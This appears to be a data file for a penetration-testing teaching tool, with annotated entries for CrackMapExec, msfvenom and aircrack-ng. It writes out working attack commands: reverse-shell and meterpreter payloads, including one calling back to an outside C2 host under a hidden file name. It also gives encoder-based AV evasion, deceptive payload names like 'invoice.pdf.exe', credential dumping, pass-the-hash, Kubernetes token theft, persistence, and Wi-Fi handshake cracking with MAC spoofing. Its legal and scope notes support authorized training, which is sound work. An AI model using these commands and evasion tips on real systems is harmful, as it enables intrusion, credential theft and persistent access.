SMB         192.168.1.50    445    DESKTOP-7HK2MN  [+] CORP\administrator:Winter2024! (Pwn3d!)
sample_outputs.explanation: The [*] line is CME fingerprinting the target: OS build (17763 = Server 2019 / Win10 1809), hostname, domain membership, whether SMB signing is enforced (False here — critical for relay attacks later), and SMBv1 status. The [+] line confirms the credential is valid AND the account has local admin rights — the '(Pwn3d!)' tag means CME successfully called the SCM (Service Control Manager) or a privileged named pipe to verify admin access, not just that auth succeeded. If you only saw [+] without Pwn3d!, the creds are valid but the account is not local admin. Next steps: (1) run --sam to dump local SAM hashes for pass-the-hash reuse, (2) run -x 'whoami /all' to confirm privilege level and group memberships, (3) note signing:False — this host is vulnerable to SMB relay (ntlmrelayx) if you can coerce authentication from it.

sample_outputs.explanation: Three critical findings in this output: (1) SRV-FILE01 rejected the hash (STATUS_LOGON_FAILURE) AND has signing:True — skip it for relay attacks, the hash doesn't work here. (2) SRV-APP02 accepted the hash with admin rights. The LSA dump reveals a service account plaintext password (_SC_MSSQLSvc:SqlProd2024!) stored as an LSA secret for a SQL Server service — this is a domain credential, not local. Immediately test it against the DC and all SQL servers with CME's mssql module. The machine account hash (SRV-APP02$) enables Silver Ticket attacks against that host's Kerberos services. The DCC2 hash (Domain Cached Credential) can be cracked offline with hashcat mode 2100. (3) WKS-DEV04 also accepts the hash — two admin footholds from one hash. Next tools: (a) secretsdump.py (impacket) against SRV-APP02 for deeper credential extraction, (b) BloodHound with --bloodhound flag to map the svc_backup account's AD ACL paths, (c) crackmapexec mssql 10.10.20.0/24 -u svc_backup -p 'SqlProd2024!' to find SQL servers where this service account has sysadmin. Note signing:True on SRV-FILE01 — if you need access there, you need valid creds or a Kerberos ticket, not a relay.

legal_notes: CFAA BOUNDARY: CME's credential testing against a subnet constitutes 'unauthorized access' under 18 U.S.C. § 1030(a)(2) for every host outside your written authorization scope — even if the credentials work. 'I had valid creds' is not a legal defense. The authorization document must explicitly name or CIDR-bound the target systems. A single /24 sweep that hits one out-of-scope host is a federal violation.

RULES OF ENGAGEMENT — HASH REUSE: Pass-the-hash operations using hashes recovered during the engagement may be explicitly restricted in your ROE even if the source host was in scope. Many enterprise clients prohibit 'credential reuse beyond the initially compromised host' without a separate authorization tier. Read your SOW before running -H against a subnet — this is the most common ROE violation on real engagements.

CLOUD/HYBRID AD CONSIDERATION: In environments with Azure AD Connect (hybrid identity), CME operations against on-prem AD accounts may trigger Azure Identity Protection risk events in the cloud tenant — even if your engagement scope is explicitly 'on-premises only.' Accounts synced to Entra ID generate cloud-side risk signals (unfamiliar sign-in properties, impossible travel) from on-prem NTLM activity. Confirm with your client whether cloud-side alerts are in or out of scope before running subnet sweeps against hybrid-joined machines.
false_positives: SIGNING DETECTION FALSE NEGATIVE: CME reports signing:False based on the SMB negotiation response, but some hosts with Windows Firewall rules or load balancers in front of them will report signing:False at the TCP layer while the actual SMB server behind them enforces signing. You'll get STATUS_ACCESS_DENIED or a signing negotiation failure mid-session rather than at fingerprint time — don't assume signing:False means relay is viable until you've confirmed with ntlmrelayx.

PWNED TAG WITHOUT REAL ADMIN: On hosts running certain endpoint agents (Carbon Black, older CrowdStrike sensor versions pre-6.x), the SCM pipe check that triggers '(Pwn3d!)' can succeed due to the agent's service account having elevated pipe permissions, even when the tested account is NOT a true local admin. Always verify with -x 'whoami /priv' before assuming full admin — a Pwn3d! tag that can't run commands is a false positive.

DOMAIN ACCOUNT SCOPE CONFUSION: CME will show [+] (valid credential) for a domain account even on hosts where that account has zero local rights. The [+] vs [+] Pwn3d! distinction is critical — operators new to CME frequently misread a subnet sweep and report 'all hosts compromised' when they mean 'credentials are domain-valid.' Only Pwn3d! indicates local admin.

NTDS DRSUAPI PARTIAL DUMP: When running --ntds drsuapi against a DC with a very large NTDS.dit (100k+ objects), CME may silently truncate output or miss accounts if the replication stream times out. The tool reports success without indicating incompleteness. Cross-validate with secretsdump.py directly and compare object counts — a 50k-account domain that returns 12k hashes from CME has a problem.

LSA SECRETS STALE DATA: LSA secrets retrieved via --lsa reflect the password at the time it was last set in the registry, not necessarily the current active password. Service accounts with automatic password rotation (LAPS-managed service accounts, CyberArk-vaulted accounts) will return a hash or plaintext that is already expired. Attempting to reuse it will generate auth failures and potentially lock the account — always check the account's last password set time in AD before reusing LSA-recovered credentials.

mitre_attack.name: Use Alternate Authentication Material: Pass the Hash
OS Credential Dumping: Security Account Manager

crackmapexec.teach_alt: Swiss army knife for Active Directory pentesting and lateral movement

msfvenom.description: Metasploit's payload generator and encoder. Creates shellcode, executables, scripts, and APKs in any format for any platform. Combines msfpayload and msfencode into a single tool. Used for creating reverse shells, bind shells, and staged/stageless payloads.
msfvenom.teach_intro: MSFvenom generates the malicious payload that runs on the victim after exploitation. Think of it as a payload factory: you choose what it does (reverse shell, bind shell, exec), what format (exe, elf, py, php, apk), and what architecture (x86, x64, ARM). The output goes on the victim, MSF multi/handler catches the connection.
msfvenom.default_command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f exe -o payload.exe

-p.label: Payload
-p.teach: Payload naming: OS/arch/type/connection. reverse_tcp calls back to you. bind_tcp opens a port on victim. Staged (/) downloads shellcode. Stageless (_) is self-contained.

-f.label: Output Format
-f.desc: Format: exe, elf, py, php, asp, aspx, rb, sh, apk, raw, c, dll.
-f.example: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o payload.exe
-f.teach: Match format to the target environment. PHP payload for web servers. ELF for Linux binaries. APK for Android. EXE for Windows.

-e.label: Encoder
-e.desc: Encode payload to avoid signature detection: -e x86/shikata_ga_nai
-e.example: msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe
-e.teach: Encoding transforms shellcode to evade AV signatures. -i 5 encodes 5 times. shikata_ga_nai is the classic encoder but most AV catches it now. Real evasion needs custom packers.

-i.label: Encoding Iterations
-i.example: msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
-i.teach: More iterations = more obfuscation. But each iteration increases file size and many AV detect the encoding wrapper itself.

-o.label: Output File
-o.teach: Always specify -o. Otherwise msfvenom outputs raw bytes to stdout. Name the file something believable: update.exe, setup.exe, invoice.pdf.exe.

-a.label: Architecture
-a.desc: Target architecture: x86, x64, arm, mipsle.
-a.example: msfvenom -p linux/arm/shell_reverse_tcp -a arm LHOST=10.10.10.1 LPORT=4444 -f elf
-a.teach: Wrong arch = payload won't execute. Check with 'file <binary>' on the target system. ARM for Raspberry Pi, IoT devices, Android.

--platform.label: Target Platform
--platform.desc: Target OS: windows, linux, osx, android, php, python, java.
--platform.example: msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe
--platform.teach: Platform determines which payload options are available. Usually auto-detected from the payload name.

-l payloads.label: List Payloads
-l payloads.desc: List all available payloads filtered by string.
-l payloads.teach: Hundreds of payload options. grep for your OS: msfvenom -l payloads | grep 'linux/x64' | grep 'shell'

opsec_notes: BEGINNER NOISE: Every msfvenom-generated executable writes a file to disk. AV/EDR products scan new files on write via kernel minifilter callbacks. On Windows, Defender for Endpoint triggers an alert within seconds of a PE landing in common staging paths (C:\Users\Public\, C:\Temp\, Downloads\). The file write itself — before execution — is the first detection event.

ARTIFACT — FILE HASH: msfvenom payloads without custom encoding produce binaries with well-known SHA256 hashes indexed in VirusTotal and NSRL. Defenders running hash-based IOC matching (CrowdStrike Falcon's IOC Management, Defender TI) will block on sight. Always assume any unmodified msfvenom output is burned the moment it touches a monitored endpoint.

CUTTING-EDGE 2025: CrowdStrike Falcon and SentinelOne both perform process-tree behavioral analysis. A payload spawned by a browser, Office macro, or PDF reader that immediately calls out to a raw IP on a non-standard port scores extremely high on their ML anomaly models. The parent-child relationship (e.g., WINWORD.EXE -> cmd.exe -> payload.exe) is logged in Falcon's process tree and triggers Suspicious Process Creation detections regardless of whether the binary is known.

CUTTING-EDGE 2025: Windows Defender for Endpoint uses AMSI integration at the script engine level. Staged payloads (windows/x64/meterpreter/reverse_tcp) that download the second stage via PowerShell or .NET reflection are caught by AMSI scanning the in-memory buffer before execution. ETW-TI (Event Tracing for Windows Threat Intelligence) captures the exact shellcode bytes being loaded into memory — this telemetry is available to EDR kernel callbacks registered since Win11 22H2 and cannot be bypassed by userland AMSI patching alone.

ARTIFACT — NETWORK: The default meterpreter reverse_tcp stager produces a recognizable TLS certificate (self-signed, specific OID pattern) and a distinctive handshake sequence. Network-based NDR products (Darktrace, ExtraHop, Vectra) fingerprint this at the packet level. Sysmon EID 3 (Network Connection) will log the outbound connection with ProcessId, DestinationIp, and DestinationPort — correlate with EID 1 (Process Create) to reconstruct the full chain.

ENCODER FALSE SENSE OF SECURITY: The -e x86/shikata_ga_nai encoder was effective against signature-based AV circa 2010-2018. In 2025, every major AV/EDR has static signatures for all shikata_ga_nai variants including multi-iteration runs. Using -i 25 -e x86/shikata_ga_nai does NOT meaningfully reduce detection on modern endpoints. Operators relying on this for evasion on live engagements will burn their payload immediately. Modern evasion requires custom loaders, LLVM obfuscation, or commercial crypters — not msfvenom encoders.

sample_outputs.scenario: Beginner: Generating a stageless Windows x64 reverse shell EXE for a lab VM at 192.168.1.50, catching it with multi/handler on the attacker box at 192.168.1.10:4444
sample_outputs.command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
sample_outputs.output:
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved to: shell.exe
sample_outputs.explanation:
The output tells you three critical things: (1) 'Payload size: 460 bytes' is the raw shellcode — this is what actually runs on the victim. (2) 'Final size of exe file: 7168 bytes' is the PE wrapper msfvenom built around it — the extra ~6700 bytes is a minimal PE stub that loads and executes the shellcode. (3) No encoder was applied, meaning the shellcode is raw and will be caught by any modern AV on static scan.

This is a STAGELESS payload (shell_reverse_tcp, not shell/reverse_tcp) — the entire shellcode is embedded in the file. When the victim runs shell.exe, it immediately connects back to 192.168.1.10:4444 with a raw TCP shell. No second-stage download needed.

Next steps: (1) Start your listener: msfconsole -q -x 'use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; run'. (2) Deliver shell.exe to the victim (SMB, web server, phishing). (3) Upgrade to meterpreter post-exploitation if needed.

sample_outputs.scenario: Advanced: Generating a stageless Linux ELF meterpreter for a compromised Ubuntu 22.04 container in a K8s cluster, using a non-standard port to blend with HTTPS egress, outputting to a named file for delivery via curl one-liner
sample_outputs.command: msfvenom -p linux/x64/meterpreter_reverse_https LHOST=attacker.redteam-c2.io LPORT=443 -f elf -o .config_update -a x64 --platform linux
sample_outputs.output:
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder specified, outputting raw payload
Payload size: 1093648 bytes
Final size of elf file: 1093648 bytes
Saved to: .config_update
sample_outputs.explanation:
Key observations: (1) 'Payload size: 1093648 bytes' equals the final ELF size — this is a STAGELESS meterpreter (meterpreter_reverse_https, not meterpreter/reverse_https). The entire meterpreter runtime is embedded. No second-stage download means no second network connection to detect, but the large file size (~1MB) is itself an anomaly worth noting. (2) The output filename '.config_update' uses a leading dot for Unix hidden-file convention — a basic masquerading technique. (3) LPORT=443 over HTTPS means the C2 traffic is TLS-encrypted and blends with legitimate web egress from the container.

In a K8s context, this payload would be delivered to the container via a writable volume mount, a kubectl exec session, or a deserialization exploit. After execution, the meterpreter session comes back over HTTPS to your multi/handler.

Next steps in the kill chain: (1) Enumerate the container environment: 'sysinfo', 'getenv', check for mounted secrets at /var/run/secrets/kubernetes.io/serviceaccount/token. (2) Use the service account token to query the K8s API server: 'kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i --list'. (3) If the SA has create/exec permissions, pivot to other pods or escape to the node via a privileged pod deployment. (4) For persistence, consider dropping a cron job or modifying an init container in a writable ConfigMap. Tools: kubectl, crictl, amicontained for capability enumeration.

legal_notes: US CFAA (18 U.S.C. § 1030): Generating a payload is not itself illegal, but deploying it against any system you do not own or have explicit written authorization to test constitutes unauthorized access. 'Written authorization' means a signed Rules of Engagement document specifying IP ranges, payload types permitted, and escalation contacts — a verbal OK from a sysadmin is not sufficient legal cover. The payload file sitting on your attacker box is inert; the moment it executes on an unauthorized system, CFAA exposure begins.

SCOPE BOUNDARY: msfvenom payloads must be scoped to the exact IP ranges and systems listed in your engagement's Statement of Work. Generating a payload for 10.0.0.5 and having it accidentally catch a callback from 10.0.0.6 (out of scope) creates legal and contractual liability. Always bind LHOST to a specific interface and confirm your handler only accepts sessions from authorized source IPs. In multi/handler, use the 'ReverseListenerBindAddress' and consider firewall rules to enforce scope at the network level.

CLOUD / CONTAINER CONSIDERATION: In cloud environments (AWS, Azure, GCP), deploying msfvenom payloads against EC2 instances, Azure VMs, or GCP Compute nodes requires authorization from BOTH the client organization AND the cloud provider under their penetration testing policies. AWS requires advance notification for certain test types; Azure and GCP have similar policies. Violating cloud provider ToS during an engagement can result in account suspension and may void your client's cloud agreement — confirm cloud provider policy before deploying payloads in any cloud-hosted environment.
false_positives: STAGED VS STAGELESS CONFUSION: The payload string 'windows/x64/meterpreter/reverse_tcp' (with a slash after meterpreter) is STAGED — it downloads the meterpreter DLL from the handler at runtime. The string 'windows/x64/meterpreter_reverse_tcp' (underscore, no slash) is STAGELESS — the full meterpreter is embedded. Operators frequently mix these up, generate a staged payload, then wonder why the handler receives a connection but immediately drops it when the stage download fails due to firewall rules blocking the second connection.

ARCHITECTURE MISMATCH SILENT FAILURE: If you generate a windows/x86 payload and deliver it to a 64-bit process, the shellcode will execute but immediately crash or produce no session. msfvenom will not warn you about architecture mismatches against a target — it generates what you ask for. Always verify target architecture before generating. A payload that 'ran but didn't work' is often an arch mismatch, not a detection event.

LHOST INTERFACE BINDING: If LHOST is set to a local interface IP (e.g., 192.168.1.10) but the victim routes through NAT or a VPN, the callback will never reach your handler. The payload executes successfully on the victim, makes a TCP connection to 192.168.1.10:4444, and the operator sees nothing. This is not a detection event — it's a routing failure. Always verify that LHOST is reachable from the victim's network perspective, not just your local interface.

ENCODER ITERATION BLOAT: Using high -i values (e.g., -i 50) with shikata_ga_nai produces a payload that takes significantly longer to decode at runtime and may exceed size limits for certain delivery vectors (e.g., buffer overflow shellcode with a fixed-size buffer, or URL-length limits in web exploits). The operator sees a successful msfvenom run but the payload fails silently at delivery because it's too large for the injection point.

HANDLER PAYLOAD MISMATCH: The payload type in msfvenom MUST exactly match the payload configured in multi/handler. Generating 'windows/x64/meterpreter/reverse_tcp' and catching it with a handler set to 'windows/x64/shell/reverse_tcp' produces a connection that immediately closes with no session. msfvenom gives no warning; the handler gives a cryptic 'Exploit completed but no session was created' message. Always copy-paste the exact payload string from msfvenom into your handler configuration.

aircrack-ng.description: The complete WiFi security auditing suite. Captures WPA2 handshakes, performs deauth attacks to force reconnections, cracks WEP/WPA/WPA2 passphrases, and monitors wireless traffic. The foundation of all WiFi security testing.
aircrack-ng.teach_intro: WiFi attacks follow a pattern: put your adapter in monitor mode → capture traffic → capture the 4-way handshake (force it with deauth) → crack the handshake offline with a wordlist. The handshake contains enough info to verify passwords without connecting to the AP.

-w.label: Wordlist
-w.teach: WPA2 cracking is a dictionary attack against the 4-way handshake. rockyou.txt covers common passphrases. Corporate networks often use complex passphrases — try specialized WiFi wordlists.

-b.label: Target BSSID
-b.desc: Filter by specific access point MAC address.
-b.teach: When your capture file has multiple APs, -b specifies which one to crack. Get the BSSID from airodump-ng output.

-e.label: Target ESSID
-e.teach: Alternative to -b. Use the network name if you don't have the BSSID.

airmon-ng.label: Monitor Mode
airmon-ng.desc: Enable/disable monitor mode on WiFi adapter.
airmon-ng.teach: Monitor mode lets your adapter see ALL WiFi frames, not just those addressed to it. Required step before any WiFi attack. Your interface becomes wlan0mon.

airodump-ng.label: Capture Traffic
airodump-ng.desc: Capture WiFi packets and discover networks.
airodump-ng.teach: Shows all APs in range with BSSID, channel, encryption, and connected clients. Focus on a target: airodump-ng -c [channel] --bssid [AP MAC] -w capture wlan0mon

aireplay-ng.label: Inject Packets / Deauth
aireplay-ng.desc: Inject packets including deauth attacks to force handshake capture.
aireplay-ng.teach: Deauth kicks the client off the network. When they reconnect, you capture the 4-way handshake. --deauth 0 runs continuously. Use -c to target a specific client.

hcxtools.label: PMKID Attack
hcxtools.desc: Capture PMKID without waiting for a client handshake.
hcxtools.example: hcxdumptool -i wlan0mon -o pmkid.pcapng && hcxpcapngtool pmkid.pcapng -o hash.txt && hashcat -m 22000 hash.txt rockyou.txt
hcxtools.teach: PMKID attack captures just from the beacon — no client needed! Convert capture to hashcat format 22000 for cracking. Faster than waiting for deauth handshake.

opsec_notes: Beginner noise: Every deauth (deauthentication) frame you send with aireplay-ng is a broadcast 802.11 management frame with your adapter's MAC address as the source. Any WIDS (Wireless Intrusion Detection System) — including consumer-grade Ubiquiti UniFi, Cisco Meraki, or Aruba — logs deauth floods as 'Deauthentication Attack Detected' within seconds. This is the loudest thing you can do on a wireless network.

Concrete defender artifact: Managed APs running Cisco Meraki or Aruba ClearPass log deauth events to syslog with the spoofed BSSID, the client MAC being deauthed, and the attacking adapter's MAC. Log path on Aruba controllers: /var/log/wireless/ids.log. Meraki surfaces this in Dashboard > Wireless > Air Marshal with timestamp and channel. Your adapter MAC is in that log unless you spoofed it BEFORE starting monitor mode.

MAC address spoofing must happen BEFORE airmon-ng start — once the interface is in monitor mode, changing MAC requires taking it back down. Use 'ip link set wlan0 down && macchanger -r wlan0 && ip link set wlan0 up' before 'airmon-ng start wlan0'. Failure to do this leaves your hardware OUI in every captured frame and every WIDS alert.

PMKID attacks (hcxdumptool + hcxtools) are significantly quieter than deauth-based handshake capture. PMKID is extracted from a single EAPOL frame sent by the AP in response to an association request — no deauth flood, no client disconnection, no WIDS deauth signature. In 2025-2026 engagements against hardened corporate WLANs, PMKID is the preferred first-pass technique before escalating to deauth.

Cutting-edge 2025-2026: Modern enterprise WIDS platforms (Cisco DNA Center, Juniper Mist AI) use ML-based anomaly detection on 802.11 frame sequences. Repeated probe-request/association/deauth cycles from a single MAC — even a spoofed one — produce a behavioral fingerprint that triggers alerts independent of signature matching. Varying channel dwell time and limiting deauth bursts to 1-2 frames (aireplay-ng -0 1) reduces this signature versus the default flood.

Cutting-edge 2025-2026: WPA3-SAE (Dragonfly handshake) networks are not crackable via offline dictionary attack using the standard aircrack-ng workflow — the SAE handshake does not expose a verifiable hash. Attempting the standard WPA2 workflow against a WPA3-only network produces a captured handshake that will never crack regardless of wordlist quality. Verify the target is advertising WPA2 (RSN IE in beacon frames) before investing capture and cracking time. Mixed WPA2/WPA3 transition mode networks remain vulnerable to WPA2 downgrade.

sample_outputs.scenario: Beginner: Authorized home lab WPA2 network. Operator puts adapter in monitor mode, scans for networks, targets their own AP, captures a 4-way handshake by deauthing a connected client, then cracks it with rockyou.txt.
sample_outputs.output:

sample_outputs.explanation: The output confirms aircrack-ng found exactly one WPA handshake in the capture file tied to BSSID AA:BB:CC:DD:EE:FF. 'KEY FOUND! [ password123 ]' means a word in rockyou.txt, when run through the PBKDF2-HMAC-SHA1 derivation with the SSID as salt, produced a PMK that matched the MIC in the EAPOL frame — proving that word is the passphrase. The Master Key (PMK) and Transient Key (PTK) are shown for reference; the Transient Key being all zeros is normal when cracking offline (it's derived per-session). Beginner takeaway: the handshake doesn't contain the password — it contains a cryptographic proof that lets you TEST passwords offline at GPU speed. Next steps: (1) if rockyou.txt fails, generate targeted wordlists with 'crunch' or 'cewl' against the target org's website; (2) convert the .cap to hashcat format with 'cap2hashcat' or 'hcxtools' for GPU acceleration — aircrack-ng's CPU cracking is ~100x slower than hashcat on a modern GPU; (3) document the PSK and move to network access phase.

sample_outputs.scenario: Advanced: Corporate engagement, WPA2-Enterprise suspected but client confirms one SSID is WPA2-PSK for IoT devices. Operator uses hcxdumptool for quiet PMKID capture, converts with hcxtools, then cracks with hashcat rule-based attack. aircrack-ng used for handshake validation fallback.
sample_outputs.command: hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_capture.pcapng --filterlist_ap=target_bssids.txt --filtermode=2 && hcxpcapngtool -o pmkid_hashes.hc22000 pmkid_capture.pcapng && hashcat -m 22000 pmkid_hashes.hc22000 /opt/wordlists/corporate_base.txt -r /usr/share/hashcat/rules/best64.rule
